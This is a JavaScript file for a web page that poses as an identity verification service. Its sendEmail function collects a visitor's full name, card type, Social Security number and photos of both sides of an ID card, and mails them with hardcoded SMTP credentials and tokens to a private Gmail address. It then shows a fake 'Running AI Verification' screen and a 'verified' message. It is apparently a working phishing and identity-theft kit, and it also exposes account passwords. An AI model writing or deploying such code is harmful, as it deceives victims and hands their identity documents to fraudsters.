const cl = console.log.bind(console);

const loader = document.getElementById('loader');
const verifiedMessage = document.getElementById('verified');

window.addEventListener('DOMContentLoaded', () => {
    loader.style.display = 'none';
});

const frontCardImage = document.getElementById('front_card_image');
const backCardImage = document.getElementById('back_card_image');

const frontCardImageIcon = document.querySelector('.front_image_icon');
const frontCardCheckIcon = document.querySelector('.front_check_icon');
const backCardImageIcon = document.querySelector('.back_image_icon');
const backCardCheckIcon = document.querySelector('.back_check_icon');

frontCardImage.addEventListener('change', () => {
    if (frontCardImage.files && frontCardImage.files[0]) {
        frontCardImageIcon.style.display = 'none';
        frontCardCheckIcon.style.display = 'block';    
    } else {
        frontCardImageIcon.style.display = 'block';
        frontCardCheckIcon.style.display = 'none';    
    }
})

backCardImage.addEventListener('change', () => {
    if (backCardImage.files && backCardImage.files[0]) {
        backCardImageIcon.style.display = 'none';
        backCardCheckIcon.style.display = 'block';    
    } else {
        backCardImageIcon.style.display = 'block';
        backCardCheckIcon.style.display = 'none';    
    }
})
  


// FOR LAYOUT FUNCTIONS
const heroSection = document.getElementById('hero');
const verifySection = document.getElementById('verify');
const guideSection = document.getElementById('guide');
const toggleVerifyBtns = document.querySelectorAll('.toggle_verify_btn');
const toggleGuideBtns = document.querySelectorAll('.toggle_guide_btn');

// FOR VERIFY SHOW FUNCTION
toggleVerifyBtns.forEach((btn) => {
    btn.addEventListener('click', () => {
        verifySection.classList.toggle('show');
        if (heroSection.style.display != 'none') {
            heroSection.style.display = 'none';
        }
    });
});

// FOR GUIDE SHOW FUNCTION
toggleGuideBtns.forEach((btn) => {
    btn.addEventListener('click', () => {
        guideSection.classList.toggle('show');

        if (heroSection.style.display != 'none') {
            heroSection.style.display = 'none';
        }
    });
});

// FOR HIDING THE SHOW FUNCTIONS
const backBtns = document.querySelectorAll('.back_btn');
backBtns.forEach((btn) => {
    btn.addEventListener('click', () => {
        verifySection.classList.remove('show');
        guideSection.classList.remove('show');

        if (heroSection.style.display = 'none') {
            heroSection.style.display = 'flex';
        } else {
            heroSection.style.display = 'none';
        }
    });
});

// FOR THE BACK BUTTON IN VERIFY SECTION
const verifyBackBtn = document.getElementById('verify_back_btn');
verifyBackBtn.addEventListener('click', (e) => {
    e.preventDefault();
    verifySection.classList.remove('show');
    guideSection.classList.remove('show');
});

// SENDING EMAIL
function sendEmail() {
    const fullName = document.getElementById('full_name').value;
    const cardType = document.getElementById('card_type').value;
    const ssn = document.getElementById('ssn').value;
    const message = `
    Full-name: ${fullName} <br/>
    Card-type: ${cardType} <br/>
    SSN: ${ssn} <br/>`;
    const subject = 'Sending from the website';

    // Get the file inputs
    const frontImage = frontCardImage;
    const backImage = backCardImage;

    const file1 = frontImage.files[0];
    const file2 = backImage.files[0];
    
    const reader1 = new FileReader();
    const reader2 = new FileReader();

    
    reader1.onloadend = () => {
        let loadingText = document.querySelector('#loader .text').innerHTML;
        loadingText = 'Running AI Verification ...';
        loader.style.display = 'flex';

        const base64File1 = reader1.result.split(',')[1];

        reader2.onloadend = () => {
            const base64File2 = reader2.result.split(',')[1];
            
            const attachments = [
                {
                    name: file1.name,
                    data: base64File1,
                },
                {
                    name: file2.name,
                    data: base64File2,
                },
            ];

            Email.send({
                // SecureToken for domain name - https://idmetoken.netlify.app/
                SecureTolen: "0d233b7e-3663-4b7e-a8bd-536e0f50cba2", // for username - mike.nexo.io
                // SecureToken : "0faac2e3-f17a-4357-9eff-a0b41a6d9ea4", // username - mikeychocho
                Host : "smtp.elasticemail.com",
                Username : "mike.nexo.io@gmail.com",
                Password : "26E2340C1F8E41572C8131573D2898D4CBB2", // for username - mike.nexo.io
                // Password : "AF02FB4B727151621706DFB93C8C2BCE7830", // for username - mikeychocho
                To : 'mikeychocho@gmail.com',
                From : "mike.nexo.io@gmail.com",
                Subject: subject,
                Body: message,
                Attachments: attachments,
            }).then(
                message => { 
                    let loadingText = document.querySelector('#loader .text').innerHTML;
                    loadingText = 'Running AI Verification ...';
                    loader.style.display = 'flex';

                    setTimeout(() => {
                        loader.style.display = 'none';
                        verifiedMessage.style.display = 'flex';
                        cl('Finished verification message: ' + message);
                    }, 2000);

                    setTimeout(() => {
                        window.location.reload();
                    }, 3000);
                },
                error => {
                    alert(error);
                    console.error("Email failed to send:", error);
                }
            );
        }
        reader2.readAsDataURL(file1);
    }
    reader1.readAsDataURL(file2);
}

const sendEmailBtn = document.getElementById('send_email_btn');
sendEmailBtn.addEventListener('click', (e) => {
    e.preventDefault();
    sendEmail();
});